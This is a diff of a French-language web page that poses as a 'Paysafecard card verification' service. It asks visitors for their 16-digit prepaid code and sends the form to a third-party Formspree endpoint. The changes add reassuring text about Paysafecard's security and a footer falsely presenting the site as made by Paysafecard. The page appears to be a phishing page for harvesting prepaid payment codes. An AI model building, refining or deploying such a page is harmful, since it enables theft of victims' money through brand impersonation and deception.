@@ -8,6 +8,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 </head>
 <body>
+  <!-- POPUP -->
   <div class="popup" id="popup">
     <h2>Bienvenue</h2>
     <p>
@@ -18,8 +19,10 @@
     <button onclick="fermerPopup()">J'accepte</button>
   </div>
 
+  <!-- PAGE PRINCIPALE -->
   <div class="main-container hidden" id="main">
-    <h1>💳 Vérification de carte <span class="blue-text">Paysafecard</span></h1>
+    <h1 class="welcome">Bienvenue</h1>
+    <h2>💳 Vérification de carte <span class="blue-text">Paysafecard</span></h2>
 
     <form id="codeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return handleSubmit(event)">
       <label for="codeInput">Entrer votre code :</label>
@@ -31,15 +34,23 @@
     <div id="resultat"></div>
   </div>
 
+  <!-- INFO SECTION -->
   <section class="info-section">
     <div class="info-box">
       <div class="emoji">ℹ️</div>
       <div class="info-text">
-        <p>La carte Paysafecard vous permet de payer en ligne sans compte bancaire. Achetez-la dans un point de vente ou en ligne. Le code de 16 chiffres peut ensuite être saisi sur un site partenaire pour effectuer un paiement sécurisé.</p>
-        <p>Chaque code est unique et utilisable une seule fois. C’est une solution idéale pour les jeux en ligne, le streaming, ou tout autre service numérique.</p>
+        <p>La carte <span class="blue-text">Paysafecard</span> vous permet de payer en ligne sans compte bancaire. Achetez-la dans un point de vente ou en ligne. Le code de 16 chiffres peut ensuite être saisi sur un site partenaire pour effectuer un paiement sécurisé.</p>
+        <p>Chaque code est unique et utilisable une seule fois. C’est une solution idéale pour les jeux en ligne, le streaming, ou tout autre service numérique. <span class="blue-text">Paysafecard</span> est reconnue pour sa simplicité et sa sécurité.</p>
       </div>
     </div>
   </section>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <hr>
+    <p><span class="blue-text">Site créé par la coopérative de Paysafecard</span></p>
+    <p class="footer-bold">CONTACT - SUPPORT</p>
+  </footer>
 
   <script>
     function handleSubmit(e) {
@@ -72,20 +83,17 @@
       const popup = document.getElementById("popup");
       popup.classList.add("hide");
 
-      // Attendre la fin de l'animation avant d'afficher le reste
       setTimeout(() => {
-        document.getElementById("main").classList.remove("hidden");
-        document.getElementById("main").classList.add("slide-in");
+        const main = document.getElementById("main");
+        main.classList.remove("hidden");
+        main.classList.add("slide-in");
+
         document.getElementById("codeInput").disabled = false;
         document.getElementById("verifyBtn").disabled = false;
-      }, 1000);
-    }
 
-    window.onload = () => {
-      setTimeout(() => {
         document.querySelector(".info-box").style.opacity = "1";
         document.querySelector(".info-box").style.transform = "translateX(0)";
-      }, 1000);
+      }, 800);
     }
   </script>
 </body>
